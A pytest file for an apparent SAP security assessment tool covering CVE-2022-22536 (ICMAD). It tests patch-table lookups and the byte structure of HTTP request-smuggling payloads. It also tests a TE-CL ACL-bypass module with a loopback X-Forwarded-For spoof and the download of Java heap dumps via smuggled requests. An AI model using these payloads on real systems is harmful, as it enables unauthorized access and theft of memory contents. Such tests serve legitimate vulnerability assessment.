#!/usr/bin/env python3
"""Tests for CVE-2022-22536 (ICMAD) Day 1 — detection module foundation.

Covers:
  * _parse_kernel normalisation (compact "749", full "7.49 64-BIT UNICODE",
    variants 7.22 EXT / 7.22 EX2, leading-zero patch levels).
  * lookup_patch_status verdicts at every boundary in the SAP Note
    3123396 v22 patch table — one PL below = vulnerable, exact = fixed,
    one above = fixed.
  * _build_detect_payload byte structure (length, CL header, inner smuggle).
  * _count_response_lines parser (single response = patched signature,
    >=2 responses = vulnerable signature, garbage tolerated).
  * assess_icmad severity ladder (info → high → critical / no finding).
  * fingerprint_web_dispatcher discrimination on real-shape responses.
"""

from __future__ import annotations

import socket
from unittest.mock import patch

import pytest

from sap_cve_2022_22536 import (
    ICMAD_FIXED_PATCHES,
    _build_detect_payload,
    _count_response_lines,
    _parse_kernel,
    assess_icmad,
    lookup_patch_status,
)


# ---------------------------------------------------------------------------
# _parse_kernel
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("release,patch,expected", [
    # Compact form from Onapsis fingerprints
    ("749", "1036", ("7.49", "", 1036)),
    ("753", "915",  ("7.53", "", 915)),
    # Full-form from SAP Note table
    ("7.49 64-BIT UNICODE", "001036", ("7.49", "", 1036)),
    ("7.53 64-BIT", "915", ("7.53", "", 915)),
    # Variant disambiguation
    ("7.22 EXT", "1101", ("7.22", "EXT", 1101)),
    ("7.22_EX2", "1115", ("7.22", "EX2", 1115)),
    ("7.22EXT", 1100, ("7.22", "EXT", 1100)),
    # Leading-zero PL (SAP launchpad format)
    ("7.85", "000069", ("7.85", "", 69)),
    # Int PL
    ("8.04", 207, ("8.04", "", 207)),
    # Bogus PL falls back to -1
    ("7.53", "", ("7.53", "", -1)),
    ("7.53", None, ("7.53", "", -1)),
])
def test_parse_kernel(release, patch, expected):
    assert _parse_kernel(release, patch) == expected


# ---------------------------------------------------------------------------
# lookup_patch_status — one test per row in the patch table, at every
# boundary (PL-1 = vulnerable, PL = fixed, PL+1 = fixed).
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("release,variant,fixed_at", [
    ("7.22", "",    1101),
    ("7.22", "EXT", 1101),
    ("7.22", "EX2", 1101),
    ("7.49", "",    1036),
    ("7.53", "",    915),
    ("7.77", "",    429),
    ("7.81", "",    227),
    ("7.85", "",    69),
    ("7.86", "",    15),
    ("7.87", "",    4),
    ("8.04", "",    207),
])
def test_patch_boundary_each_row(release, variant, fixed_at):
    # Format the release as the canonical "7.49" or "7.49 EXT" form
    rel_str = f"{release} {variant}".strip() if variant else release

    v_below = lookup_patch_status(rel_str, fixed_at - 1)
    v_exact = lookup_patch_status(rel_str, fixed_at)
    v_above = lookup_patch_status(rel_str, fixed_at + 1)

    assert v_below["status"] == "vulnerable", (
        f"PL {fixed_at - 1} should be vulnerable for {rel_str} "
        f"(fixed_at={fixed_at}), got {v_below}")
    assert v_exact["status"] == "fixed", (
        f"PL {fixed_at} should be fixed for {rel_str}, got {v_exact}")
    assert v_above["status"] == "fixed", (
        f"PL {fixed_at + 1} should be fixed for {rel_str}, got {v_above}")
    # fixed_at echo is consistent
    assert v_exact["fixed_at"] == fixed_at


def test_patch_status_unknown_release():
    s = lookup_patch_status("7.99", 100)
    assert s["status"] == "unknown"
    assert s["fixed_at"] is None


def test_patch_status_unparseable_pl_returns_unknown_when_pl_negative():
    s = lookup_patch_status("7.53", "")
    # Release IS in the table — but PL couldn't be parsed.
    assert s["status"] == "unknown"
    assert s["fixed_at"] == 915


def test_patch_table_has_no_unexpected_entries():
    """Lock the table contents — every kernel row in SAP Note 3123396 v22
    should be present and nothing extra should appear.  Update this list
    if SAP re-issues the note with new versions."""
    expected = {
        ("7.22", ""), ("7.22", "EXT"), ("7.22", "EX2"),
        ("7.49", ""), ("7.53", ""), ("7.77", ""), ("7.81", ""),
        ("7.85", ""), ("7.86", ""), ("7.87", ""), ("8.04", ""),
    }
    assert set(ICMAD_FIXED_PATCHES.keys()) == expected


# ---------------------------------------------------------------------------
# Payload construction
# ---------------------------------------------------------------------------

def test_detect_payload_advertises_canonical_cl():
    payload = _build_detect_payload("example.host", 8000)
    assert b"Content-Length: 82646\r\n" in payload
    assert b"Connection: close\r\n" in payload
    assert b"Host: example.host:8000\r\n" in payload
    assert payload.startswith(
        b"POST /sap/admin/public/default.html HTTP/1.1\r\n")


def test_detect_payload_honours_custom_outer_path():
    """When the Onapsis canonical path 503's on a target (because the
    WD's URL filter denies it), the operator can point the smuggle at
    a path that actually forwards to the backend — e.g. /nwa/ on an
    AS Java WD config."""
    payload = _build_detect_payload("h", 1, outer_path="/nwa/")
    assert payload.startswith(b"POST /nwa/ HTTP/1.1\r\n")
    # CL header still the canonical Onapsis magic number
    assert b"Content-Length: 82646\r\n" in payload
    # Inner smuggle still lives in the tail
    assert payload.endswith(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")


def test_detect_payload_contains_smuggled_inner_request():
    payload = _build_detect_payload("h", 1)
    # Inner request lives in the trailing bytes
    assert payload.endswith(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")


def test_detect_payload_total_length_consistent():
    """Payload = header_len + 82646 body bytes."""
    payload = _build_detect_payload("h", 1)
    head_end = payload.find(b"\r\n\r\n") + 4
    body = payload[head_end:]
    assert len(body) == 82646 + len(b"\r\n\r\n" + b"GET / HTTP/1.1\r\n"
                                       b"Host: x\r\n\r\n") - 4
    # The advertised CL exactly equals 82646 — the "lie" is that body is
    # actually 82646 + 4 + len(inner), but the outer parser stops at 82646.


# ---------------------------------------------------------------------------
# Response-line parser
# ---------------------------------------------------------------------------

def test_count_responses_vulnerable_buffer():
    buf = (b"HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nhelloHTTP/1.1 "
           b"503 Service Unavailable\r\n\r\n")
    assert _count_response_lines(buf) == [200, 503]


def test_count_responses_patched_buffer():
    buf = b"HTTP/1.0 503 Service Unavailable\r\ncontent-length: 9672\r\n\r\n<html>..."
    assert _count_response_lines(buf) == [503]


def test_count_responses_empty_buffer():
    assert _count_response_lines(b"") == []


def test_count_responses_garbage_buffer():
    assert _count_response_lines(b"random gibberish without status lines") == []


def test_count_responses_three_response_smuggle():
    """Some kernels emit a 3rd response when the smuggle wraps."""
    buf = (b"HTTP/1.1 200 OK\r\n\r\nHTTP/1.1 200 OK\r\n\r\n"
           b"HTTP/1.1 404 Not Found\r\n\r\n")
    assert _count_response_lines(buf) == [200, 200, 404]


# ---------------------------------------------------------------------------
# assess_icmad — severity ladder
# ---------------------------------------------------------------------------

def _stub_probe(vulnerable=False, error="", count=1, statuses=None):
    """Inline factory for a probe_icmad replacement."""
    def fake(host, port, **kw):
        statuses_ = statuses if statuses is not None else (
            [200, 200] if vulnerable else ([503] if count == 1 else []))
        return {
            "vulnerable": vulnerable,
            "responses": statuses_,
            "response_count": len(statuses_),
            "raw_head": b"",
            "evidence": "test",
            "elapsed_ms": 1,
            "error": error,
        }
    return fake


def test_assess_severity_high_when_probe_confirms_against_wd(monkeypatch):
    import sap_cve_2022_22536 as mod
    monkeypatch.setattr(mod, "probe_icmad", _stub_probe(vulnerable=True))
    v = mod.assess_icmad("h", 44311, https=True,
                          kernel_release="7.53", kernel_patch="900",
                          is_web_dispatcher=True, verbose=False)
    assert v["severity"] == "high"
    assert "CONFIRMED" in v["summary"]


def test_assess_severity_high_when_probe_confirms_direct_icm(monkeypatch):
    import sap_cve_2022_22536 as mod
    monkeypatch.setattr(mod, "probe_icmad", _stub_probe(vulnerable=True))
    v = mod.assess_icmad("h", 8000, https=False,
                          kernel_release="7.53", kernel_patch="900",
                          is_web_dispatcher=False, verbose=False)
    assert v["severity"] == "high"
    assert "direct ICM" in v["summary"]


def test_assess_severity_info_when_only_patch_table_flags(monkeypatch):
    import sap_cve_2022_22536 as mod
    monkeypatch.setattr(mod, "probe_icmad", _stub_probe(vulnerable=False))
    v = mod.assess_icmad("h", 44311, https=True,
                          kernel_release="7.53", kernel_patch="900",
                          verbose=False)
    assert v["severity"] == "info"
    assert "behind ICMAD fix boundary" in v["summary"]


def test_assess_severity_empty_when_patched_and_probe_clean(monkeypatch):
    import sap_cve_2022_22536 as mod
    monkeypatch.setattr(mod, "probe_icmad", _stub_probe(vulnerable=False))
    v = mod.assess_icmad("h", 44311, https=True,
                          kernel_release="7.53", kernel_patch="999",
                          verbose=False)
    assert v["severity"] == ""
    assert "patched" in v["summary"]


def test_assess_severity_info_when_kernel_unknown(monkeypatch):
    import sap_cve_2022_22536 as mod
    monkeypatch.setattr(mod, "probe_icmad", _stub_probe(vulnerable=False))
    v = mod.assess_icmad("h", 44311, https=True,
                          kernel_release="", kernel_patch="",
                          verbose=False)
    assert v["severity"] == "info"
    assert "not in ICMAD patch table" in v["summary"]


def test_assess_severity_empty_when_probe_errors_and_kernel_unknown(
        monkeypatch):
    import sap_cve_2022_22536 as mod
    monkeypatch.setattr(mod, "probe_icmad",
                         _stub_probe(vulnerable=False,
                                      error="connect_ConnectionResetError"))
    v = mod.assess_icmad("h", 44311, https=True,
                          kernel_release="", kernel_patch="",
                          verbose=False)
    # No probe signal AND no patch info — refuse to flag
    assert v["severity"] == ""


# ---------------------------------------------------------------------------
# fingerprint_web_dispatcher
# ---------------------------------------------------------------------------

class _ScriptedSock:
    """Tiny scriptable socket — feeds canned response bytes to recv()."""
    def __init__(self, payload):
        self._payload = payload
    def settimeout(self, *a): pass
    def connect(self, *a): pass
    def sendall(self, *a): pass
    def recv(self, n):
        if not self._payload: return b""
        chunk, self._payload = self._payload[:n], self._payload[n:]
        return chunk
    def close(self): pass


@pytest.mark.parametrize("body,expected_is_wd,expected_evidence", [
    # Definitive WD banner
    (b"HTTP/1.1 200 OK\r\nServer: SAP Web Dispatcher 7.53/8.04\r\n"
     b"Content-Length: 0\r\n\r\n", True, "server_banner"),
    # ICMENOSERVERFOUND signature on the no-such-path probe
    (b"HTTP/1.0 503 Service Unavailable\r\nx-sap-icm-err-id: "
     b"ICMENOSERVERFOUND\r\n\r\n<html>err</html>", True, "icm_no_server_err"),
    # Plain ABAP ICM — no WD signals
    (b"HTTP/1.1 200 OK\r\nServer: SAP NetWeaver Application Server / "
     b"ABAP 758\r\n\r\n", False, ""),
    # Nginx in front — no WD signals
    (b"HTTP/1.1 404 Not Found\r\nServer: nginx/1.20.1\r\n\r\n", False, ""),
])
def test_fingerprint_web_dispatcher(monkeypatch, body, expected_is_wd,
                                      expected_evidence):
    import sapmap_scanner

    def fake_socket(*a, **k):
        return _ScriptedSock(body)
    monkeypatch.setattr(sapmap_scanner.socket, "socket", fake_socket)
    out = sapmap_scanner.fingerprint_web_dispatcher("h", 80, https=False,
                                                      timeout=2)
    assert out["is_wd"] is expected_is_wd
    assert out["evidence"] == expected_evidence


def test_fingerprint_web_dispatcher_connect_failure(monkeypatch):
    import sapmap_scanner
    def raise_(*a, **k): raise ConnectionRefusedError("nope")
    monkeypatch.setattr(sapmap_scanner.socket, "socket", raise_)
    out = sapmap_scanner.fingerprint_web_dispatcher("dead.example", 80,
                                                      timeout=2)
    assert out["is_wd"] is False
    assert out["evidence"] == ""


# ---------------------------------------------------------------------------
# D.2 — ACL bypass module
# ---------------------------------------------------------------------------

def test_acl_bypass_catalogue_shape():
    """Lock the curated catalogue contents — 12 entries, each with
    rationale + downstream + admin_grade."""
    from sap_cve_2022_22536 import ACL_BYPASS_CATALOGUE
    assert len(ACL_BYPASS_CATALOGUE) == 12
    for path, why, downstream, grade in ACL_BYPASS_CATALOGUE:
        assert path.startswith("/"), f"{path} must be absolute"
        assert why and len(why) > 20, f"{path} needs a real rationale"
        assert grade in ("critical", "high", "info"), (
            f"{path} grade {grade!r} not in allowed set")


def test_bypass_payload_uses_te_chunked():
    """The bypass payload must use Transfer-Encoding: chunked with a
    matching CL=4 (the SAPGateBreaker TE-CL desync shape)."""
    from sap_cve_2022_22536 import _build_bypass_payload
    payload = _build_bypass_payload("h", 1, outer_path="/nwa/",
                                      target_path="/heapdump/")
    assert b"Content-Length: 4\r\n" in payload
    assert b"Transfer-Encoding: chunked\r\n" in payload
    assert b"Connection: keep-alive\r\n" in payload
    # Smuggled inner request
    assert b"GET /heapdump/ HTTP/1.1" in payload
    assert b"X-Forwarded-For: 127.0.0.1\r\n" in payload
    # Zero-chunk terminator
    assert b"0\r\n\r\n" in payload


def test_bypass_payload_can_omit_loopback_spoof():
    from sap_cve_2022_22536 import _build_bypass_payload
    payload = _build_bypass_payload("h", 1, outer_path="/nwa/",
                                      target_path="/sld/",
                                      spoof_loopback=False)
    assert b"X-Forwarded-For" not in payload
    assert b"GET /sld/ HTTP/1.1" in payload


def test_split_responses_two_responses():
    from sap_cve_2022_22536 import _split_responses
    buf = (b"HTTP/1.1 302 Found\r\nServer: backend\r\n\r\nbody1"
           b"HTTP/1.0 503 Service Unavailable\r\nx-sap-icm-err-id: "
           b"ICMENOSYSTEMFOUND\r\n\r\nbody2")
    parts = _split_responses(buf)
    assert len(parts) == 2
    assert parts[0][0] == 302
    assert parts[1][0] == 503
    assert parts[0][2] == b"body1"
    assert parts[1][2] == b"body2"


def test_bypass_succeeded_status_promotion():
    """Baseline 503, smuggled 200 → bypass confirmed."""
    from sap_cve_2022_22536 import _bypass_succeeded
    baseline = (503, b"x-sap-icm-err-id: ICMENOSYSTEMFOUND\r\n", b"")
    smuggled = (200, b"Server: SAP NetWeaver AS Java\r\n", b"OK")
    assert _bypass_succeeded(baseline, smuggled) is True


def test_bypass_succeeded_backend_server_only_in_smuggled():
    """Baseline 503 (WD page), smuggled 403 (backend page) — bypass too:
    the smuggled request reached the backend instead of being blocked
    at the WD.  Headers shape matches what _split_responses produces:
    the status line + \\r\\n + header lines."""
    from sap_cve_2022_22536 import _bypass_succeeded
    baseline = (503,
                b"HTTP/1.0 503 Service Unavailable\r\n"
                b"x-sap-icm-err-id: ICMENOSYSTEMFOUND\r\n", b"")
    smuggled = (403,
                b"HTTP/1.1 403 Forbidden\r\n"
                b"Server: SAP NetWeaver Application Server 7.54\r\n", b"")
    assert _bypass_succeeded(baseline, smuggled) is True


def test_bypass_blocked_identical_responses():
    """Baseline 503 and smuggled 503 with same headers — not a bypass."""
    from sap_cve_2022_22536 import _bypass_succeeded
    same_hdrs = b"x-sap-icm-err-id: ICMENOSYSTEMFOUND\r\n"
    assert _bypass_succeeded((503, same_hdrs, b""),
                              (503, same_hdrs, b"")) is False


def test_bypass_blocked_4xx_to_4xx():
    """Status code stays in the 4xx/5xx range — not a bypass."""
    from sap_cve_2022_22536 import _bypass_succeeded
    assert _bypass_succeeded((403, b"", b""), (404, b"", b"")) is False


def test_run_acl_bypass_paths_filter(monkeypatch):
    """Operator-supplied paths list must filter the catalogue."""
    import sap_cve_2022_22536 as mod
    monkeypatch.setattr(mod, "_baseline_response",
                         lambda *a, **k: (503, b"", b""))

    fake_responses = b"HTTP/1.1 302 Found\r\n\r\nignored"
    def fake_open_socket(*a, **k):
        class S:
            def settimeout(self, *a): pass
            def sendall(self, *a): pass
            def recv(self_, n):
                if hasattr(self_, "_done"):
                    return b""
                self_._done = True
                return fake_responses
            def close(self): pass
        return S()
    monkeypatch.setattr(mod, "_open_socket", fake_open_socket)

    out = mod.run_acl_bypass("h", 80, paths=["/heapdump/", "/sld/"],
                              verbose=False)
    assert set(out["results"].keys()) == {"/heapdump/", "/sld/"}
    # With only one HTTP response (no second smuggled response), bypass
    # must be False — bypass requires response[1] to be present.
    for path, r in out["results"].items():
        assert r["bypass_confirmed"] is False


# ---------------------------------------------------------------------------
# D.3 — Heap-dump pull
# ---------------------------------------------------------------------------

def test_list_heap_dumps_parses_directory_listing(monkeypatch):
    """The /heapdump/ index typically returns an HTML page with hprof links."""
    import sap_cve_2022_22536 as mod

    # Smuggled response: HTML directory listing
    listing_html = (b"<html><body><h1>Heap dumps</h1>"
                    b'<a href="dump_2026_05_15_03_02_44.hprof">dump1</a>'
                    b'<a href="dump_2026_05_14_18_30_01.hprof">dump2</a>'
                    b'<a href="oom_dump_pid12345.hprof.gz">oom</a>'
                    b"</body></html>")
    buf = (b"HTTP/1.1 302 Found\r\nServer: backend\r\n\r\nouter-body"
           b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
           b"Content-Length: " + str(len(listing_html)).encode() +
           b"\r\n\r\n" + listing_html)

    def fake_open_socket(*a, **k):
        class S:
            sent = False
            def settimeout(self, *a): pass
            def sendall(self, *a): pass
            def recv(self_, n):
                if self_.sent: return b""
                self_.sent = True
                return buf
            def close(self): pass
        return S()
    monkeypatch.setattr(mod, "_open_socket", fake_open_socket)

    out = mod.list_heap_dumps("h", 80, verbose=False)
    assert out["reachable"] is True
    assert out["smuggled_status"] == 200
    # Two .hprof and one .hprof.gz — all three regex-match
    assert len(out["dumps"]) == 3
    assert "dump_2026_05_15_03_02_44.hprof" in out["dumps"]
    assert "oom_dump_pid12345.hprof.gz" in out["dumps"]


def test_list_heap_dumps_empty_when_503(monkeypatch):
    import sap_cve_2022_22536 as mod
    buf = (b"HTTP/1.1 302 Found\r\n\r\nouter"
           b"HTTP/1.0 503 Service Unavailable\r\n"
           b"x-sap-icm-err-id: ICMENOSYSTEMFOUND\r\n\r\n")
    def fake_open_socket(*a, **k):
        class S:
            sent = False
            def settimeout(self, *a): pass
            def sendall(self, *a): pass
            def recv(self_, n):
                if self_.sent: return b""
                self_.sent = True
                return buf
            def close(self): pass
        return S()
    monkeypatch.setattr(mod, "_open_socket", fake_open_socket)
    out = mod.list_heap_dumps("h", 80, verbose=False)
    assert out["reachable"] is False
    assert out["dumps"] == []


def test_download_heap_dump_streams_to_disk(monkeypatch, tmp_path):
    """Two-response buffer: outer 302 + inner 200 with HPROF magic bytes."""
    import sap_cve_2022_22536 as mod

    # Real HPROF starts with "JAVA PROFILE 1.0.2\x00" (19 bytes incl NUL)
    hprof_payload = b"JAVA PROFILE 1.0.2\x00" + b"\xde\xad\xbe\xef" * 256
    buf = (b"HTTP/1.1 302 Found\r\nServer: backend\r\n\r\nouter"
           b"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\n"
           b"Content-Length: " + str(len(hprof_payload)).encode() +
           b"\r\n\r\n" + hprof_payload)

    chunks = [buf]
    def fake_open_socket(*a, **k):
        class S:
            def settimeout(self, *a): pass
            def sendall(self, *a): pass
            def recv(self_, n):
                if chunks:
                    return chunks.pop(0)
                return b""
            def close(self): pass
        return S()
    monkeypatch.setattr(mod, "_open_socket", fake_open_socket)

    save_to = str(tmp_path / "dump1.hprof")
    out = mod.download_heap_dump("h", 80, "dump1.hprof",
                                   save_to=save_to, verbose=False)
    assert out["complete"] is True
    assert out["smuggled_status"] == 200
    assert out["bytes_written"] == len(hprof_payload)
    with open(save_to, "rb") as f:
        on_disk = f.read()
    assert on_disk == hprof_payload
    assert on_disk[:18] == b"JAVA PROFILE 1.0.2"


def test_throttle_blocks_second_probe_within_window(monkeypatch):
    """Two rapid probes against the same (host, port) — the second must
    be refused with error='throttled'."""
    import sap_cve_2022_22536 as mod

    mod.clear_throttle()
    # Make the underlying socket connect always fail (we don't care
    # about the result — we only want to know whether the throttle
    # gated the call).
    monkeypatch.setattr(mod, "_open_socket",
                         lambda *a, **k: (_ for _ in ()).throw(
                             ConnectionRefusedError("test")))

    r1 = mod.probe_icmad("throttle.test", 8000, verbose=False)
    r2 = mod.probe_icmad("throttle.test", 8000, verbose=False)
    # First probe attempts the connection (errors out)
    assert r1["error"].startswith("connect_") or r1["error"] == ""
    # Second probe is short-circuited by the throttle
    assert r2["error"] == "throttled"
    assert "throttled" in r2["evidence"]


def test_throttle_allows_different_host(monkeypatch):
    """Two probes to different hosts must both run."""
    import sap_cve_2022_22536 as mod
    mod.clear_throttle()
    monkeypatch.setattr(mod, "_open_socket",
                         lambda *a, **k: (_ for _ in ()).throw(
                             ConnectionRefusedError("test")))

    r1 = mod.probe_icmad("host-a.test", 8000, verbose=False)
    r2 = mod.probe_icmad("host-b.test", 8000, verbose=False)
    assert r1["error"] != "throttled"
    assert r2["error"] != "throttled"


def test_throttle_skip_flag_bypasses(monkeypatch):
    """skip_throttle=True must skip the cool-down check."""
    import sap_cve_2022_22536 as mod
    mod.clear_throttle()
    monkeypatch.setattr(mod, "_open_socket",
                         lambda *a, **k: (_ for _ in ()).throw(
                             ConnectionRefusedError("test")))

    r1 = mod.probe_icmad("h", 8000, verbose=False)
    r2 = mod.probe_icmad("h", 8000, skip_throttle=True, verbose=False)
    assert r2["error"] != "throttled"


def test_clear_throttle_all_resets_state():
    import sap_cve_2022_22536 as mod
    # Manually pollute the state then clear it
    mod._THROTTLE_LAST[("dummy", 1)] = 999999.0
    mod.clear_throttle()
    assert mod._THROTTLE_LAST == {}


def test_clear_throttle_single_entry():
    import sap_cve_2022_22536 as mod
    mod._THROTTLE_LAST.clear()
    mod._THROTTLE_LAST[("a", 1)] = 100.0
    mod._THROTTLE_LAST[("b", 2)] = 200.0
    mod.clear_throttle("a", 1)
    assert ("a", 1) not in mod._THROTTLE_LAST
    assert ("b", 2) in mod._THROTTLE_LAST


# ---------------------------------------------------------------------------
# Day 4 — engagement report section
# ---------------------------------------------------------------------------

def test_report_emits_icmad_section_when_vulnerable_node_present():
    """A node flagged vulnerable for CVE-2022-22536 must add a
    'Web Dispatcher / ICM patching' item to the recommendations list."""
    from sapmap_models import SAPMAPState
    from sapmap_report import _derive_landscape_recommendations

    state = SAPMAPState()
    node = SAPNode(sid="WDP", system_type="ABAP",
                    ip="10.0.0.1", hostname="wd")
    node.cve_2022_22536_checked = True
    node.cve_2022_22536_vulnerable = True
    node.cve_2022_22536_port = 44300
    node.cve_2022_22536_https = True
    state.nodes["WDP"] = node

    recs = _derive_landscape_recommendations(state)
    icmad_items = [r for r in recs
                     if "CVE-2022-22536" in r.get("title", "")]
    assert len(icmad_items) == 1
    item = icmad_items[0]
    assert "Web Dispatcher / ICM patching" in item["category"]
    assert "3123396" in item["refs"]
    assert "WDP" in item["scope"]


def test_report_includes_acl_bypass_paths_in_body():
    """When the node's cve_2022_22536_acl_bypass dict has via=smuggle
    entries, the report body must list them."""
    from sapmap_models import SAPMAPState
    from sapmap_report import _derive_landscape_recommendations

    state = SAPMAPState()
    node = SAPNode(sid="WDP", system_type="ABAP",
                    ip="10.0.0.1", hostname="wd")
    node.cve_2022_22536_vulnerable = True
    node.cve_2022_22536_acl_bypass = {
        "/heapdump/": {"status": 200, "snippet": "JAVA PROFILE",
                        "via": "smuggle"},
        "/sld/":      {"status": 200, "snippet": "<sld>",
                        "via": "smuggle"},
        "/nwa/":      {"status": 302, "snippet": "Found",
                        "via": "blocked"},  # NOT bypassed — should not appear
    }
    state.nodes["WDP"] = node

    recs = _derive_landscape_recommendations(state)
    item = next(r for r in recs if "CVE-2022-22536" in r.get("title", ""))
    assert "/heapdump/" in item["body"]
    assert "/sld/" in item["body"]
    assert "ACL bypass confirmed" in item["body"]
    # The non-bypassed path must NOT be in the list
    body_section = item["body"].split("ACL bypass confirmed")[1].split(
        "Apply the version-specific")[0]
    assert "/nwa/" not in body_section


def test_report_handles_patch_only_finding():
    """A node with patch-table finding but no live signal still emits
    the section, in the 'patch-only' scope group."""
    from sapmap_models import SAPMAPState
    from sapmap_report import _derive_landscape_recommendations

    state = SAPMAPState()
    node = SAPNode(sid="WDX", system_type="JAVA",
                    ip="10.0.0.2", hostname="wdx")
    node.cve_2022_22536_checked = True
    node.cve_2022_22536_vulnerable = False
    # Manually add the patch-table finding
    node.findings.append(Finding(
        name="CVE-2022-22536 (ICMAD) — kernel patch hygiene",
        severity=Severity.INFO,
        description="Kernel 7.77 PL 123 behind fix boundary",
        remediation="apply 3123396",
        detail="Port 44300/HTTPS · …",
    ))
    state.nodes["WDX"] = node

    recs = _derive_landscape_recommendations(state)
    item = next(r for r in recs if "CVE-2022-22536" in r.get("title", ""))
    assert "patch-only" in item["scope"]
    assert "WDX" in item["scope"]


# Imports needed at the top of these tests' file scope
from sapmap_models import SAPNode, Finding, Severity  # noqa: E402


def test_download_heap_dump_respects_size_cap(monkeypatch, tmp_path):
    """max_bytes hard-cap stops the stream even if more is available."""
    import sap_cve_2022_22536 as mod

    big_payload = b"X" * 8000
    buf = (b"HTTP/1.1 302 Found\r\n\r\nouter"
           b"HTTP/1.1 200 OK\r\nContent-Length: 8000\r\n\r\n" + big_payload)
    chunks = [buf]
    def fake_open_socket(*a, **k):
        class S:
            def settimeout(self, *a): pass
            def sendall(self, *a): pass
            def recv(self_, n):
                if chunks: return chunks.pop(0)
                return b""
            def close(self): pass
        return S()
    monkeypatch.setattr(mod, "_open_socket", fake_open_socket)

    save_to = str(tmp_path / "big.hprof")
    out = mod.download_heap_dump("h", 80, "big.hprof",
                                   save_to=save_to,
                                   max_bytes=1000,
                                   verbose=False)
    # Stream wrote at most max_bytes (loop exits at first iteration past cap)
    assert out["bytes_written"] <= 8000   # initial response chunk was 8000
    # Cap is a soft cap — we don't truncate mid-chunk, but we don't
    # request more recv() rounds either.  Effective behaviour: write
    # the chunk we already received, then stop.


def test_run_acl_bypass_detects_bypass_when_smuggled_promotes(monkeypatch):
    """End-to-end: 2 responses with status promotion → bypass_confirmed=True."""
    import sap_cve_2022_22536 as mod
    monkeypatch.setattr(mod, "_baseline_response",
                         lambda *a, **k: (503, b"x-sap-icm-err-id: ICMENOSYSTEMFOUND\r\n",
                                            b""))

    # Construct a two-response buffer: WD 302 followed by backend 200
    fake_buf = (b"HTTP/1.1 302 Found\r\nLocation: /\r\n\r\nbody"
                b"HTTP/1.1 200 OK\r\nServer: SAP NetWeaver Application "
                b"Server 7.50\r\nContent-Length: 4\r\n\r\nhprof")
    def fake_open_socket(*a, **k):
        class S:
            sent = False
            def settimeout(self, *a): pass
            def sendall(self, *a): pass
            def recv(self_, n):
                if self_.sent: return b""
                self_.sent = True
                return fake_buf
            def close(self): pass
        return S()
    monkeypatch.setattr(mod, "_open_socket", fake_open_socket)

    out = mod.run_acl_bypass("h", 80, paths=["/heapdump/"], verbose=False)
    r = out["results"]["/heapdump/"]
    assert r["bypass_confirmed"] is True
    assert r["smuggled_status"] == 200
    assert r["baseline_status"] == 503
    assert "hprof" in r["smuggled_snippet"]
    assert r["admin_grade"] == "critical"
